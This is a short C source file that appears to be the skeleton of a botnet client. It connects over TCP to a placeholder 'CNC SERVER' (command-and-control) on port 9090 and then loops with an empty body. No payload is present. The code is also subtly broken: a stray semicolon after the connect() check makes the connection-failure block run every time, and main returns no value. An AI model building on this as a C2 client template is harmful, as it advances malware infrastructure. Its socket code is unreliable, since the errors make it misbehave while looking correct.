#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include "fatal.h"


#define PORT 9090
#define DEBUG


int main() {
    int sockfd, n;
    struct sockaddr_in serv_addr;

    char message[200], reply[200];


    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) 
    {
#ifdef DEBUG
        fatal("CLIENT SOCKET COULD NOT BE STARTED\n");
#endif
        return;
    }

    serv_addr.sin_addr.s_addr = inet_addr("your_server_address");
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    if(connect(sockfd, (struct sockaddr *)&serv_addr, sizeof (struct sockaddr_in)) == -1);
    {
#ifdef DEBUG
        fatal("COULD NOT ESTABLISH CONNECTION TO CNC SERVER\n");
#endif
    }

    while(1) {
        // DO STUFF FOR SERVER
    }

    close(sockfd);
    return 0;
}
